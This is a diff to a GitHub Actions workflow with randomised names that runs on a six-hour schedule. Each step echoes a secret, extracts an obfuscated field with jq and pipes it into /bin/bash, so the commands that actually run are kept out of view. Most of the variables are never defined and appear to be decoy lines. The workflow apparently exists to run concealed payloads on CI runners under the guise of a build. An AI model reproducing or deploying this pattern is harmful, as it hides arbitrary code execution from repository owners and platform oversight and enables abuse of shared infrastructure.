@@ -1,8 +1,9 @@
 name: shenerwei7651
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 1/6 * * *'
+    - cron: '21 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,14 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: shenerwei7651
         env:
-          d6428: ${{ secrets.d6428 }}
+          ud2224: ${{ secrets.ud2224 }}
         run: |
-          echo $d6428 | jq -r .dex64 | /bin/bash
-          echo $c86 | jq -r .yizwd846 | /bin/bash
-          echo $xnfe1 | jq -r .dh22 | /bin/bash
-          echo $gi53 | jq -r .bynyd9822 | /bin/bash
-          echo $b0 | jq -r .zlv17781 | /bin/bash
-          echo $icpoy68 | jq -r .swgy86352 | /bin/bash
-          echo $on04176 | jq -r .kyuee1616 | /bin/bash
-          echo $d6 | jq -r .dbt4527 | /bin/bash
+          echo $ud2224 | jq -r .qryc8 | /bin/bash
+          echo $bnodf0 | jq -r .fii450 | /bin/bash
+          echo $kotba2 | jq -r .xn586 | /bin/bash
+          echo $lx40599 | jq -r .lgrj09482 | /bin/bash
+          echo $ho7 | jq -r .q53 | /bin/bash
+          echo $gx97 | jq -r .xvfj83 | /bin/bash
+          echo $f38009 | jq -r .j92189 | /bin/bash
+          echo $e8615 | jq -r .bg44 | /bin/bash
+          echo $ao2422 | jq -r .r17937 | /bin/bash
+          echo $zgl1457 | jq -r .a20111 | /bin/bash
+          echo $epfl5149 | jq -r .fplew991 | /bin/bash
 
